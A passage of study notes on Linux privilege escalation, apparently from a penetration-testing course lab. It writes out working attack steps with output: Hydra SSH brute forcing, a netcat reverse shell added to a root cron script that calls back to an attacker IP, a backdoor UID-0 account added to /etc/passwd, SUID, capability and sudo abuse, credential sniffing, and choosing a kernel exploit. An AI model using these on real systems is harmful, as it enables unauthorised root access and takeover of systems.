/usr/bin/pkexec
/usr/bin/ntfs-3g
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/bwrap
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
```

In this case, the command found several SUID binaries
+ Exploitation of SUID binaries will vary based on several factors
+ For example, if **/bin/cp** (the _copy_ command) were SUID, we could copy and overwrite sensitive files such as **/etc/passwd** 

Can hexdump a binary to review its context closely, can also cat it:
```
hexdump -C <FILE> > <OUTFILE>
```
+ Can view the file easier with `less <OUTFILE>`, note that it is q to quit 
#### Escalation Techniques 
A comprehensive list of Linux privilege escalation techniques can be found in a compendium[24](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/linux-privilege-escalation/enumerating-linux/manual-enumeration#fn24) by **g0tmi1k** as well as in other, more up-to-date, resources

### Automated Enumeration 
As we learned in the previous section, Linux systems contain a wealth of information that can be used for further attacks
+ However, collecting this detailed information manually can be rather time-consuming. Fortunately, we can use various scripts to automate this process

To get an initial baseline of the target system, we can use _unix-privesc-check_ on UNIX derivatives such as Linux
+ This Bash script is pre-installed on our local Kali machine at **/usr/bin/unix-privesc-check**, and it performs a number of checks to find any system misconfigurations that can be abused for local privilege escalation
+ We can review the tool's details by running the script without any arguments
+ Usage:
```
unix-privesc-check
```
+ Example output:
```
unix-privesc-check v1.4 ( http://pentestmonkey.net/tools/unix-privesc-check )

Usage: unix-privesc-check { standard | detailed }

"standard" mode: Speed-optimised check of lots of security settings.

"detailed" mode: Same as standard mode, but also checks perms of open file
                 handles and called files (e.g. parsed from shell scripts,
                 linked .so files).  This mode is slow and prone to false 
                 positives but might help you find more subtle flaws in 3rd
                 party programs.

This script checks file permissions and other settings that could allow
local users to escalate privileges.
...
```

As shown in the listing above, the script supports "standard" and "detailed" mode
+ Based on the provided information, the standard mode appears to perform a speed-optimized process and should provide a reduced number of false positives
+ Therefore, in the following example we are going to transfer the script to the target system and use the standard mode to redirect the entire output to a file called **output.txt**
+ Usage:
```
./unix-privesc-check standard > output.txt
```

The script performs numerous checks for permissions on common files
+ For example, the following excerpt reveals configuration files that are writable by non-root users:
```
Checking for writable config files
############################################
    Checking if anyone except root can change /etc/passwd
WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
    Checking if anyone except root can change /etc/group
    Checking if anyone except root can change /etc/fstab
    Checking if anyone except root can change /etc/profile
    Checking if anyone except root can change /etc/sudoers
    Checking if anyone except root can change /etc/shadow
```

This output reveals that anyone on the system can edit **/etc/passwd**
+ This is quite significant as it allows attackers to easily elevate their privileges or create user accounts on the target
+ We will demonstrate this later in the Module

There are many other tools worth mentioning that are specifically tailored for Linux privilege escalation information gathering, including _LinEnum_ and _LinPeas_, which have been actively developed and enhanced over recent years

Although these tools perform many automated checks, we should bear in mind that every system is different, and unique one-off system changes will often be missed by these types of tools
+ For this reason, it's important to check for unique configurations that can only be caught by manual inspection, as illustrated in the previous section

## Exposed Confidential Information
We are going to inspect how user and service history files constitute the initial stage of privilege escalation, often leading to the desired outcome

### Inspecting User Trails
As penetration testers, we are often time-constrained during our engagements. For this reason, we should focus our efforts first on low-hanging fruit
+ One such target is users' history files
+ These files often hold clear-text user activity that might include sensitive information such as passwords or other authentication material

On Linux systems, applications frequently store user-specific configuration files and subdirectories within a user's home directory
+ These files are often called _dotfiles_ because they are prepended with a period
+ The prepended dot character instructs the system not to display these files when inspecting by basic listing commands

One example of a dotfile is **.bashrc**
+ The **.bashrc** bash script is executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session
+ From inside this script, additional environment variables can be specified to be automatically set whenever a new user's shell is spawned
+ Sometimes system administrators store credentials inside environment variables as a way to interact with custom scripts that require authentication

Reviewing our target Debian machine, we'll notice an unusual environment variable entry
+ Usage:
```
env
```
+ Example output:
```
...
XDG_SESSION_CLASS=user
TERM=xterm-256color
SCRIPT_CREDENTIALS=lab
USER=joe
LC_TERMINAL_VERSION=3.4.16
SHLVL=1
XDG_SESSION_ID=35
LC_CTYPE=UTF-8
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=192.168.118.2 59808 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
MAIL=/var/mail/joe
SSH_TTY=/dev/pts/1
OLDPWD=/home/joe/.cache
_=/usr/bin/env
```
+ Interestingly, the _SCRIPT_CREDENTIALS_ variable holds a value that resembles a password

To confirm that we are dealing with a permanent variable, we need to inspect the **.bashrc** configuration file
+ Usage:
```
cat .bashrc
```
+ Example output:
```
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
export SCRIPT_CREDENTIALS="lab"
HISTCONTROL=ignoreboth
...
```
+ From the above listing, we can confirm that the variable holding the password is exported when a user's shell is launched
	+ Storing a clear-text password inside an environment variable is not considered a secure best practice. To safely authenticate with an interactive script, it's recommended to adopt public key authentication and protect private keys with passphrases

Let's first try to escalate our privileges by directly typing the newly-discovered password:
```
su - root
```
+ Checking user:
```
root@debian-privesc:~# whoami
root
```

Since we've successfully obtained root privileges, let's now try another privilege escalation route that is instead based on the environment variable credential finding
+ Instead of aiming directly for the root account, we could try gaining access to the _eve_ user we discovered during a previous section

With our knowledge of script credentials, we could try building a custom dictionary derived from the known password to attempt brute forcing _eve_'s account
+ We can do this by using the **crunch** command line tool to generate a custom wordlist
+ We'll set the minimum and maximum length to 6 characters, specify the pattern using the **-t** parameter, then hard-code the first three characters to **Lab** followed by three numeric digits
+ Usage:
```
crunch 6 6 -t Lab%%% > wordlist
```
+ We can then verify the content of the generated wordlist:
```
kali@kali:~$ cat wordlist
Lab000
Lab001
Lab002
Lab003
Lab004
Lab005
Lab006
Lab007
Lab008
Lab009
...
```

Since an SSH server is available on our target machine, we can try to attempt a remote brute force attack via <mark style="background: #D2B3FFA6;">Hydra</mark>
+ We'll supply the target username with the **-l** parameter, our wordlist with **-P**, the target IP address, and finally **ssh** as the target protocol. We will also include **-V** to increase verbosity
+ Usage:
```
hydra -l <USER> -P <WORDLIST>  <IP> -t 4 ssh -V
```
+ Example usage and output:
```
kali@kali:~$ hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-23 14:30:44
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1000 login tries (l:1/p:1000), ~250 tries per task
[DATA] attacking ssh://192.168.50.214:22/
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab000" - 1 of 1000 [child 0] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab001" - 2 of 1000 [child 1] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab002" - 3 of 1000 [child 2] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab003" - 4 of 1000 [child 3] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab004" - 5 of 1000 [child 2] (0/0)
...
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab120" - 121 of 1000 [child 0] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab121" - 122 of 1000 [child 3] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab122" - 123 of 1000 [child 2] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab123" - 124 of 1000 [child 1] (0/0)
[22][ssh] host: 192.168.50.214   login: eve   password: Lab123
1 of 1 target successfully completed, 1 valid password found
```

Our hydra brute forcing attack succeeded and we can now directly log in to the target machine with eve's credentials via SSH:
```
kali@kali:~$ ssh eve@192.168.50.214
eve@192.168.50.214's password:
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
...
eve@debian-privesc:~$
```

Once logged in as _eve_, we can verify if we are running as a privileged user by listing the sudo capabilities using the **sudo -l** command
+ Usage:
```
sudo -l
```
+ Example output:
```
[sudo] password for eve:
Matching Defaults entries for eve on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eve may run the following commands on debian-privesc:
    (ALL : ALL) ALL
```

Since _eve_ seems to be an administrative account, we discover it can run any command as an elevated user
+ This means we can elevate directly to root by running _i_ with sudo and supplying eve's credentials
+ Usage:
```
sudo -i
```
+ Verify escalation:
```
root@debian-privesc:/home/eve# whoami
root
```

### Inspecting Service Footprints 
System _daemons_ are Linux services that are spawned at boot time to perform specific operations without any need for user interaction
+ Linux servers are often configured to host numerous daemons, like SSH, web servers, and databases, to mention a few

System administrators often rely on custom daemons to execute ad-hoc tasks and they sometimes neglect security best practices
+ As part of our enumeration efforts, we should inspect the behavior of running processes to hunt for any anomaly that might lead to an elevation of privileges

Unlike on Windows systems, on Linux we can list information about higher-privilege processes such as the ones running inside the _root_ user context
+ We can enumerate all the running processes with the _ps_ command and since it only takes a single snapshot of the active processes, we can refresh it using the _watch_ command
+ In the following example, we will run the **ps** command every second via the **watch** utility and **grep** the results on any occurrence of the word "pass"
+ Usage:
```
watch -n 1 "ps -aux | grep pass"
```
+ Example output:
```
...

joe      16867  0.0  0.1   6352  2996 pts/0    S+   05:41   0:00 watch -n 1 ps -aux | grep pass
root     16880  0.0  0.0   2384   756 ?        S    05:41   0:00 sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'
root     16881  0.0  0.0   2356  1640 ?        S    05:41   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
...
```
+ We notice the administrator has configured a system daemon that is connecting to the local system with eve's credentials in clear text
+ Most importantly, the fact that the process is running as _root_ does not prevent us from inspecting its activity

Another more holistic angle we should take into consideration when enumerating for privilege escalation is to verify whether we have rights to capture network traffic
+ _tcpdump_ is the de facto command line standard for packet capture, and it requires administrative access since it operates on raw sockets
+ However, it's not uncommon to find IT personnel accounts have been given exclusive access to this tool for troubleshooting purposes.

To illustrate the concept, we can run tcpdump as the _joe_ user who has been granted specific sudo permissions to run it 
+ tcpdump cannot be run without sudo permissions. 
+ That is because it needs to set up raw sockets in order to capture traffic, which is a privileged operation

Let's try to capture traffic in and out of the loopback interface, then dump its content in ASCII using the **-A** parameter
+ Ultimately, we want to filter any traffic containing the "pass" keyword
+ Usage:
```
sudo tcpdump -i lo -A | grep "pass"
```
+ Example output:
```
[sudo] password for joe:
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...{...zuser:root,pass:lab -
...5...5user:root,pass:lab -
```
+ After a few seconds we are prompted with the root user's clear text credentials

## Insecure File Permissions
Will inspect how misconfigured file permissions might lead to different paths for privilege escalation

### Abusing Cron Jobs
Let's focus on another family of privilege escalation techniques and learn how to leverage insecure file permissions
+ For this section, we will assume that we have already gained access to our Linux target machine as an unprivileged user

In order to leverage insecure file permissions, we must locate an executable file that not only allows us write access, but also runs at an elevated privilege level
+ On a Linux system, the cron time-based job scheduler is a prime target, since system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions

For this example, we will SSH into the VM 1 as the _joe_ user, providing _offsec_ as a password
+ In a previous section, we demonstrated where to check the filesystem for installed cron jobs on a target system
+ We could also inspect the cron log file (**/var/log/cron.log**) for running cron jobs
+ Usage:
```
grep "CRON" /var/log/syslog
```
+ Example output:
```
...
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (pidfile fd = 3)
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (Running @reboot jobs)
Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```

It appears that a script called **user_backups.sh** under **/home/joe/** is executed in the context of the root user
+ Judging by the timestamps, it seems that this job runs once every minute

Since we know the location of the script, we can inspect its contents and permissions:
```
joe@debian-privesc:~$ cat /home/joe/.scripts/user_backups.sh
#!/bin/bash

cp -rf /home/joe/ /var/backups/joe/

joe@debian-privesc:~$ ls -lah /home/joe/.scripts/user_backups.sh
-rwxrwxrw- 1 root root 49 Aug 25 05:12 /home/joe/.scripts/user_backups.sh
```

The script itself is fairly straight-forward: it simply copies the user's **home** directory to the **backups** subdirectory
+ The permissions of the script reveal that every local user can write to the file

Since an unprivileged user can modify the contents of the backup script, we can edit it and add a reverse shell _one-liner_
+ If our plan works, we should receive a root-level reverse shell on our attacking machine after, at most, a one-minute period
+ Reverse shell one line (Make sure and replace the IP): 
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 1234 >/tmp/f
```
+ It works via the following:
	- `rm /tmp/f`: Deletes the file `/tmp/f` if it already exists. This ensures a clean start for the FIFO (First In, First Out) pipe that will be created.
	- `mkfifo /tmp/f`: Creates a named pipe (FIFO) named `/tmp/f`. This pipe will act as a conduit for communication between processes.
	- `cat /tmp/f | /bin/sh -i 2>&1`: Sets up a command to run `/bin/sh` (Bourne Again Shell) interactively (`-i` flag) and redirects its standard input and output to `/tmp/f`. This means the shell will read input from and write output to the FIFO pipe.
	- `nc 192.168.118.2 1234 >/tmp/f`: Initiates a connection to IP address `192.168.118.2` on port `1234` using the `nc` (netcat) command and redirects its output to `/tmp/f`. This sends the input/output of the shell to the specified IP and port.
		- Using an example IP
+ Example execution:
```
joe@debian-privesc:~$ cd .scripts

joe@debian-privesc:~/.scripts$ echo >> user_backups.sh

joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh

joe@debian-privesc:~/.scripts$ cat user_backups.sh
#!/bin/bash

cp -rf /home/joe/ /var/backups/joe/


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
```

All we have to do now is set up a listener on our Kali Linux machine and wait for the cron job to execute:
```
nc -nvlp 1234
```

As shown in the previous listing, the cron job did execute, as well as the reverse shell one-liner
+ We have successfully elevated our privileges and have access to a root shell on the target

### Abusing Password Authentication 
Unless a centralized credential system such as Active Directory or LDAP is used, Linux passwords are generally stored in **/etc/shadow**, which is not readable by normal users
+ Historically however, password hashes, along with other account information, were stored in the world-readable file **/etc/passwd**
+ For backwards compatibility, if a password hash is present in the second column of an **/etc/passwd** user record, it is considered valid for authentication and it takes precedence over the respective entry in **/etc/shadow**, if available
+ This means that if we can write into **/etc/passwd**, we can effectively set an arbitrary password for any account

In a previous section, we showed that our Debian client may be vulnerable to privilege escalation due to the fact that the **/etc/passwd** permissions were not set correctly
+ To escalate our privileges, let's add another superuser (root2) and the corresponding password hash to **/etc/passwd**
+ We will first generate the password hash using the **openssl** tool and the **passwd** argument
+ By default, if no other option is specified, openssl will generate a hash using the _crypt algorithm_, a supported hashing mechanism for Linux authentication
	+ The output of the OpenSSL _passwd_ command may vary depending on the system executing it. On older systems, it may default to the DES algorithm, while on some newer systems it could output the password in MD5 format

Once we have the generated hash, we will add a line to **/etc/passwd** using the appropriate format
+ Hash generation (should be on the target machine):
```
openssl passwd w00t
```
+ Will then put it in appropriate format in /etc/passwd
```
echo 'root2:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
```
+ Can now escalate privileges:
```
joe@debian-privesc:~$ su root2
Password: w00t

root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)
```
+ Seen above: the _root2_ user and the _w00t_ password hash in our **/etc/passwd** record were followed by the user id (UID) zero and the group id (GID) zero
+ These zero values specify that the account we created is a superuser Linux account
+ Finally, in order to verify that our modifications were valid, we used **su** to switch our standard user to the newly-created _root2_ account, then issued the **id** command to show that we indeed have _root_ privileges

Even though finding **/etc/passwd** world-writable might seem unlikely, many organizations implement hybrid integrations with third-party vendors that may compromise security for easier usability

## Insecure System Components
Will explore how misconfigured system applications and permissions can also lead to elevation of rights
### Abusing Setuid Binaries and Capabilities
As we anticipated earlier in this Module, when not properly secured, setuid binaries can lead to attacks that elevate privileges

Before attempting the actual exploitation technique, let's review the purpose behind a setuid binary using a brief example
+ When a user or a system-automated script launches a process, it inherits the UID/GID of its initiating script: this is known as the real UID/GID

As previously discussed, user passwords are stored as hashes within **/etc/shadow**, which is owned and writable only by root (uid=0)
+ How, then, can non-privileged users access this file to change their own password?

To circumvent this issue, the effective UID/GID was introduced, which represents the actual value being checked when performing sensitive operations

To better demonstrate this concept, let's analyze the _passwd_ program, which is responsible for changing the password for the user executing it 
+ On the Debian lab machine, we'll connect as _joe_ and execute the **passwd** command without typing anything afterwards, so that the process remains active in memory
```
joe@debian-privesc:~$ passwd
Changing password for joe.
Current password:
```

Leaving the program in standby, let's open another shell as _joe_ to further inspect the process
+ To find the PID (process ID) of the passwd program, we can list all processes and filter the output based on the target name:
```
joe@debian-privesc:~$ ps u -C passwd
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      1932  0.0  0.1   9364  2984 pts/0    S+   01:51   0:00 passwd
```
+ Interestingly, passwd is running as the root user: this is needed for it to access and modify **/etc/shadow**

We can also inspect the real UID and effective UID assigned for the process by inspecting the _proc_ pseudo-filesystem, which allows us to interact with kernel information
+ Using the passwd's PID (1932) from the previous output, let's inspect the content at **/proc/1932/status**, which provides a summary of the process attributes:
```
joe@debian-privesc:~$ grep Uid /proc/1932/status
Uid:	1000	0	0	0
```

Filtering by the "Uid" keyword returns four parameters that correspond to the real, effective, saved set, and filesystem UIDs
+ In this case, the Real UID value is 1000, which is expected as it belongs to _joe_
+ However, the other three values, including the effective UID, equal the root's ID 0: let's consider why

Under normal circumstances, all four values would belong to the same user who launched the executable
+ For instance, the bash process for _joe_ (PID 1131 in this case) has the following values
```
joe@debian-privesc:~$ cat /proc/1131/status | grep Uid
Uid:	1000	1000	1000	1000
```

The _passwd_ binary behaves differently because the binary program has a special flag named Set-User-ID, or SUID in short. Let's inspect it:
```
joe@debian-privesc:~$ ls -asl /usr/bin/passwd
64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
```

The SUID flag is depicted with the **s** flag in the above output
+ This flag can be configured using the **`chmod u+s <filename>`** command, and it sets the effective UID of the running process to the executable owner's user ID - in this case root's

Using this technique results in a legitimate and constrained privilege escalation and because of this (as we'll learn shortly), the SUID binary must be bug-free to avoid any misuse of the application

As a practical example, once we've completed manual or automated enumeration, we'll have discovered that the **find** utility is misconfigured and has the SUID flag set

We can quickly abuse this vulnerability by running the _find_ program to search any well-known file, like our own Desktop folder
+ Once the file is found, we can instruct _find_ to perform any action through the _-exec_ parameter
+ In this case, we want to execute a bash shell along with the _Set Builtin_ _`-p`_ parameter that is preventing the effective user from being reset
+ Usage:
```
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```
+ Example:
```
bash-5.0# id
uid=1000(joe) gid=1000(joe) euid=0(root) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
bash-5.0# whoami
root
```

After running the command, we've obtained a root shell and we'll observe that although the UID still belongs to _joe_, the effective user ID is from _root_

Another set of features subject to privilege escalation techniques are _Linux capabilities_
+ Capabilities are extra attributes that can be applied to processes, binaries, and services to assign specific privileges normally reserved for administrative operations, such as traffic capturing or adding kernel modules
+ Similarly to setuid binaries, if misconfigured, these capabilities could allow an attacker to elevate their privileges to root

To demonstrate these risks, let's try to manually enumerate our target system for binaries with capabilities
+ We are going to run **getcap** with the **-r** parameter to perform a recursive search starting from the root folder **/**, filtering out any errors from the terminal output
+ Usage:
```
/usr/sbin/getcap -r / 2>/dev/null
```
+ Example output:
```
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

The two _perl_ binaries stand out as they have _setuid_ capabilities enabled, along with the _+ep_ flag specifying that these capabilities are _effective_ and _permitted_
+ Even though they seem similar, capabilities, setuid, and the setuid flag are located in different places within the Linux ELF file format

In order to exploit this capability misconfiguration, we could check the _GTFOBins_ (https://gtfobins.github.io/) website
+ This site provides an organized list of UNIX binaries and how can they be misused to elevate our privileges

Searching for "Perl" on the GTFOBins website, we'll find precise instructions for which command to use to exploit capabilities
+ We'll use the whole command, which executes a shell along with a few POSIX directives enabling setuid
```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
+ Example:
```
perl: warning: Setting locale failed.
...
# id
uid=0(root) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
```
+ We managed to gain a root shell via yet another misconfiguration vector.

### Abusing Sudo 
On UNIX systems, the _sudo_ utility can be used to execute a command with elevated privileges
+ To be able to use sudo, our low-privileged user account must be a member of the sudo group (on Debian based Linux distributions)
+ The word "sudo" stands for "Superuser-Do", and we can think of it as changing the effective user-id of the executed command

Custom configurations of sudo-related permissions can be applied in the **/etc/sudoers** file
+ We can use the **-l** or **--list** option to list the allowed commands for the current user:
```
sudo -l
```
+ Example output:
```
[sudo] password for joe:
Matching Defaults entries for joe on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on debian-privesc:
    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```
+ Above we notice that only crontab jobs, tcpdump, and apt-get utilities are listed as allowing _sudo_ commands

If the **/etc/sudoers** configurations are too permissive, a user could abuse the short-lived administrative right to obtain permanent root access
+ Since the first of the three permitted commands does not allow us to edit any crontab, it's unlikely that we could use this to find any escalation route
+ The second command looks more promising, so let's browse GTFObins for suggestions on how to abuse it
+ Running the hinted commands, however, reveals an unexpected outcome:
```
joe@debian-privesc:~$ COMMAND='id'
joe@debian-privesc:~$ TF=$(mktemp)
joe@debian-privesc:~$ echo "$COMMAND" > $TF
joe@debian-privesc:~$ chmod +x $TF
joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
[sudo] password for joe:
dropped privs to root
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...
compress_savefile: execlp(/tmp/tmp.c5hrJ5UrsF, /dev/null) failed: Permission denied
```
+ Surprisingly, once we've executed the suggested command-set, we are prompted with a "permission denied" error message

To further investigate the culprit, we can inspect the **syslog** file for any occurrence of the _tcpdump_ keyword:
```
joe@debian-privesc:~$ cat /var/log/syslog | grep tcpdump
...
Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
```
+ Above shows that the _audit_ daemon has logged our privilege escalation attempt
+ Closer inspection reveals that _AppArmor_ was triggered and blocked us

AppArmor is a kernel module that provides mandatory access control (MAC) on Linux systems by running various application-specific profiles, and it's enabled by default on Debian 10
+ We can verify AppArmor's status as the _root_ user using the **aa-status** command
```
joe@debian-privesc:~$ su - root
Password:
root@debian-privesc:~# aa-status
apparmor module is loaded.
20 profiles are loaded.
18 profiles are in enforce mode.
   /usr/bin/evince
   /usr/bin/evince-previewer
   /usr/bin/evince-previewer//sanitized_helper
   /usr/bin/evince-thumbnailer
   /usr/bin/evince//sanitized_helper
   /usr/bin/man
   /usr/lib/cups/backend/cups-pdf
   /usr/sbin/cups-browsed
   /usr/sbin/cupsd
   /usr/sbin/cupsd//third_party
   /usr/sbin/tcpdump
...
2 profiles are in complain mode.
   libreoffice-oopslash
   libreoffice-soffice
3 processes have profiles defined.
3 processes are in enforce mode.
   /usr/sbin/cups-browsed (502)
   /usr/sbin/cupsd (654)
   /usr/lib/cups/notifier/dbus (658) /usr/sbin/cupsd
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.
```
+ Above confirms that tcpdump is actively protected with a dedicated AppArmor profile

Since the first two commands from the **sudoers** file did not work, let's examine the third allowed _sudo_ command: _apt-get_
+ Returning again to GTFOBins, we'll select the first option (a).
+ The payload first runs the changelog _apt-get_ command option, invoking the _less_ application from which we can execute a bash shell
```
sudo apt-get changelog apt
!/bin/sh
```

We can try the above commands as the _joe_ user by copying them in our active shell:
```
joe@debian-privesc:~$ sudo apt-get changelog apt
...
Fetched 459 kB in 0s (39.7 MB/s)
# id
uid=0(root) gid=0(root) groups=0(root)
```

We managed to obtain a privileged _root_ shell by abusing a misconfigured sudo configuration

### Exploiting Kernel Vulnerabilities 
Kernel exploits are an excellent way to escalate privileges, but our success may depend on matching not only the target's kernel version, but also the operating system flavor, such as Debian, RHEL, Gentoo, etc

To demonstrate this attack vector, we will first gather information about our Ubuntu target by inspecting the **/etc/issue** file
+ As discussed earlier in the Module, this is a system text file that contains a message or system identification to be printed before the login prompt on Linux machines:
```
cat /etc/issue
```
+ Example output:
```
Ubuntu 16.04.4 LTS \n \l
```

Next, we will inspect the kernel version and system architecture using standard system commands:
```
joe@ubuntu-privesc:~$ uname -r 
4.4.0-116-generic
```
```
joe@ubuntu-privesc:~$ arch 
x86_64
```

Our target system appears to be running Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generic) on the x86_64 architecture
+ Armed with this information, we can use <mark style="background: #D2B3FFA6;">searchsploit</mark> on our local Kali system to find kernel exploits matching the target version
+ Want to use "linux kernel Ubuntu 16 Local Privilege Escalation" as our main keywords
+ We also want to filter out some clutter from the output, so we'll exclude anything below kernel version 4.4.0 and anything that matches kernel version 4.8:
```
kali@kali:~$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"

Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - 'ldso_hwcap_64 Stack Clash' Local Privilege Escalation| linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_dynamic Stack Clash' Local Privilege Escalation                       | linux_x86/local/42276.c
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1)                                                                      | linux/local/39166.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)                                                                           | linux/local/40759.rb
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege Escalation                                                   | linux_x86-64/local/40049.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation                                                              | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escalation                                                                    | linux/local/40489.txt
Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege Escalation (1)                                                                 | linux_x86/local/15916.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                             | linux/local/45010.c
```
+ Let's try the last exploit (**linux/local/45010.c**), since it seems to be newer and also matches our kernel version as it targets any version below 4.13.9
+ We'll use **gcc** on Linux to compile our exploit, keeping in mind that when compiling code, we must match the architecture of our target
+ This is especially important in situations where the target machine does not have a compiler and we are forced to compile the exploit on our attacking machine or in a sandboxed environment that replicates the target OS and architecture

Although learning every detail of a Linux kernel exploit is outside the scope of this Module, we still need to understand the initial compilation instructions
+ To do so, let's copy the exploit into our Kali home folder and then inspect the first 20 lines of it to spot any compilation instructions
```
kali@kali:~$ cp /usr/share/exploitdb/exploits/linux/local/45010.c .

kali@kali:~$ head 45010.c -n 20
/*
  Credit @bleidl, this is a slight modification to his original POC
  https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c

  For details on how the exploit works, please visit
  https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html

  Tested on Ubuntu 16.04 with the following Kernels
  4.4.0-31-generic
  4.4.0-62-generic
  4.4.0-81-generic
  4.4.0-116-generic
  4.8.0-58-generic
  4.10.0.42-generic
  4.13.0-21-generic

  Tested on Fedora 27
  4.13.9-300
  gcc cve-2017-16995.c -o cve-2017-16995
  internet@client:~/cve-2017-16995$ ./cve-2017-16995
```

Luckily, to compile the source code into an executable, we just need to invoke **gcc** and specify the C source code and the output filename
